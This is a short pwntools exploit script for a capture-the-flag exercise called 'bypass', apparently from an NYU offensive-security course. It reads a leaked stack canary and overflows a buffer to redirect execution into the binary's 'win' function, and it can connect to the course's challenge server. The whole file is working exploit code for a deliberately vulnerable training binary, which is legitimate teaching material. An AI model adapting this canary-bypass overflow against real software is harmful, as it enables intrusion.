from pwn import *

# context.log_level = "DEBUG"
context.terminal = ["tmux", "splitw", "-f", "-h"]
target_file = "./bypass"

LOCAL = True

if LOCAL:
    p = process(target_file)
    # p = gdb.debug(target_file, '''
    # b main
    # b get_input
    # continue
    # ''')
else:
    p = remote("offsec-chalbroker.osiris.cyber.nyu.edu", 1281)
    p.recvuntil(b"abc123):")
    p.sendline(b"nam10102")

e = ELF(target_file, checksec=False)
target_addr = e.symbols.win
print(f'Target address: {hex(target_addr)}')
p.recvuntil(b"you: ")
a = asm("endbr64; push rbp", arch='amd64',os='linux')
hex_string_number = p.recvline().strip()
number = int(hex_string_number, 16)
print(f'Number: {number}')
p.recvuntil(b"\t> ")
p.sendline((b'B' * 0x18) + p64(number) + (b'B' * 0x8) + p64(target_addr + len(a)))
# p.recvuntil(b"You made it!")
p.interactive()
